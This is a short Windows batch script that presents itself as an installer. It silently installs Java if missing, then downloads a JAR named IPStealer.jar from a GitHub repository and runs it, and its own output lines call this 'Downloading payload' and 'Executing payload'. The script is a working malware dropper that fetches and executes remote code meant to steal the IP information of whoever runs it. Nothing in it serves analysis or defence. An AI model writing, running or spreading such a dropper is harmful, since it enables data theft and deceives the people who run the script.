@echo off
setlocal enabledelayedexpansion
echo [Phase 1] Starting installation...

:: Check for Java
where java >nul 2>&1
if !errorlevel! neq 0 (
    echo [Phase 2] Java not found. Installing Java 18...
    
    :: Download Java installer
    echo Downloading Java installer...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4', '%TEMP%\jre.exe')"
    
    :: Install Java silently
    echo Installing Java (this may take a minute)...
    start /wait "" "%TEMP%\jre.exe" /s
    timeout /t 45 /nobreak >nul
    
    :: Clean up
    del "%TEMP%\jre.exe" 2>nul
    echo Java installation complete.
) else (
    echo [Phase 2] Java is already installed.
)

:: Download the JAR
echo [Phase 3] Downloading payload...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar', '%TEMP%\ip.jar')"

:: Run the JAR
echo [Phase 4] Executing payload...
java -jar "%TEMP%\ip.jar"

echo [Phase 5] Done.
timeout /t 3 /nobreak >nul
exit
